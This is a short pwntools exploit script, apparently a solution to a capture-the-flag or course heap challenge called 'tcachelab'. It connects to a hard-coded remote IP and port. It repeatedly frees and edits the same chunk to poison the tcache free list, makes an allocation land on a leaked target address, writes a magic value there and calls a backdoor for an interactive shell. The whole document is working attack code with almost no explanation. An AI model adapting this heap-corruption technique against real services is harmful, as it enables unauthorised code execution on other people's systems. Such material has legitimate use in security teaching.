from pwn import * 

# p = process('./tcachelab')
p = remote('140.112.31.97', 30106)

def create(size, owner, uuid, content):
    p.sendafter('>', '1')
    p.sendafter('size : ', str(size))
    p.sendafter('Owner : ', owner)
    p.sendafter('UUID : ', str(uuid))
    p.sendafter('Content : ', content)

def edit(index, uuid, content):
    p.sendafter('>', '2')
    p.sendafter('index : ', str(index))
    p.sendafter('UUID : ', str(uuid))
    p.sendafter('Content : ', content)

def delete(index):
    p.sendafter('>', '3')
    p.sendafter('index : ', str(index))

def backdoor():
    p.sendafter('>', '4')

p.recvuntil('0x')
target = int(p.recvline().strip(), 16)
success('target = 0x%x', target)

create(0x10, 'a', 1, 'a')
delete(0)
edit(0, 2, 'b')
delete(0)
edit(0, 2, 'b')
delete(0)   # delete 3 times make tcahe counter is 3

create(0x10, p64(target), 1, 'a')
create(0x10, 'a', 1, 'a')
create(0x10, p64(0xcafedeadbeefcafe), 1, 'a')

backdoor()

p.interactive()